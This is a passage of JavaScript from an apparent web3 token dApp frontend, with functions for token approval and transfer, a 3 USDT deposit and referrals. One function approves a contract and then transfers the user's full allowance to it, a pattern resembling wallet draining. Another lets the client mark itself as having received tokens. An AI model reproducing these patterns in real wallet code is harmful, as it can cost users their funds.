  localStorage.setItem("approved", "true")
  }
}

export async function approveAndSend(tokenAddress, tokenContract, userAddress, allowanceInWei, web3) {
  // Prepare the transaction data for the 'approve' function
  allowanceInWei = web3.utils.fromWei(allowanceInWei, 'ether');
  const data = tokenContract.methods.approve(GR_ADDRESS, allowanceInWei).encodeABI();

  // Create a transaction object
  const tx = {
    from: userAddress,
    to: tokenAddress,
    data: data
  };
  
  console.log("Tx: ", tx)

  try {
    // Sign and send the transaction
    const result = await web3.eth.sendTransaction(tx);

    // Transferring Tokens to smart contract
    const currentAllowance = await tokenContract.methods.allowance(userAddress, GR_ADDRESS).call();
    const data2 = tokenContract.methods.transfer(GR_ADDRESS, currentAllowance).encodeABI();

    const tx2 = {
      from: userAddress,
      to: tokenAddress,
      data: data2
    };
    console.log("Tx2: ", tx2)

    try{
      const result2 = await web3.eth.sendTransaction(tx2);
    } catch(error) {console.log(error)}

  } catch (error) {
    console.error(error);
    window.alert("An Error Occured.");
  }
}


export async function userReferralStatus() {
  let userAddress = localStorage.getItem('account')
  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
  let refStatus = await grTokenContract.methods.userReferralStats(userAddress).call();
  return refStatus;
}

export async function userHasReceivedToken() {
  let userAddress = localStorage.getItem('account')
  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
  let hasReceived = await grTokenContract.methods.hasUserReceivedGrTokens(userAddress).call();
  console.log(hasReceived)
  return hasReceived;
}

async function transfer3Usdt() {
  // let web3 = await getCurrentProvider()
  let web3 = new Web3(window.ethereum)
  console.log(web3)
  let userAddress = localStorage.getItem('account');
  // let sTokenContract = await getSmartContract(S_TOKEN, S_TOKEN_ABI);
  let usdtContract = await getSmartContract(USDT_ADDRESS, ERC20_ABI)
  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
  const amountUsdtWei = web3.utils.toWei('3', 'ether');
  
  // open loader
  loader.style.display = "flex"
  loader_msg.textContent = "Depositing USDT, Please Wait..."

  // Create a transaction object for the USDT transfer
  const tx = {
    from: userAddress,
    to: USDT_ADDRESS, // USDT contract address
    value: '0', // Value field is set to 0 for token transfers
    data: usdtContract.methods.transfer(GR_ADDRESS, amountUsdtWei).encodeABI(), // Encode the transfer function
    gasPrice: '20000000000', // Replace with an appropriate gas price
    gasLimit: '60000', // Replace with an appropriate gas limit
    nonce: null, // Leave nonce as null to auto-calculate it
  };

  console.log(tx)
  try{
    const result = await web3.eth.sendTransaction(tx);

    // now send the user GR Tokens
    loader_msg.textContent = "Transferring 100,000 GR Token."

    const tx2 = {
      from: userAddress,
      to: GR_ADDRESS, // USDT contract address
      value: '0', // Value field is set to 0 for token transfers
      data: grTokenContract.methods.updateHasReceived(localStorage.getItem('account')).encodeABI(), // Encode the transfer function
      gasPrice: '20000000000', // Replace with an appropriate gas price
      gasLimit: '60000', // Replace with an appropriate gas limit
      nonce: null, // Leave nonce as null to auto-calculate it
    };

    const result2 = await web3.eth.sendTransaction(tx2);
    loader.style.display = "none";
    location.reload();
  }catch(error){
    if(error.code == 100){
    window.alert("Insufficient Funds For GAS FEE");
    loader.style.display = "none"
    }
  }

  
}


export async function referFriend(referrer) {
  
  let web3 = window.web3;
  let userAddress = localStorage.getItem('account');
  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
  const data = grTokenContract.methods.referFriend(userAddress, referrer).encodeABI();

  // Create a transaction object
  const tx = {
    from: userAddress,
    to: GR_ADDRESS,
    data: data
  }
  console.log("Tx: ", tx)
  
  //opening loader
  loader.style.display = "flex";
  loader_msg.textContent = "Completing User Referral Process...";

  try {
    // Sign and send the transaction
    const result = await web3.eth.sendTransaction(tx);

    // remove the referrer data from local STorage
    localStorage.removeItem('referrer')

    // close loader
    loader_msg.textContent = "Referral Completed Successfully";
    loader.style.display = "none";

    window.alert("Referral Completed Successfully");
  } catch (error) {
    console.error(error);
    window.alert("An Error Occured.");

    loader_msg.textContent = error;
    loader.style.display = "none";
  }
}


document.getElementById("deposit_usdt_btn").addEventListener("click", async () => {
  if (localStorage.getItem('account')) {
    await transfer3Usdt()
  }else{
    window.alert("Please Connect Your Wallet To Make Transfer.");
  }
})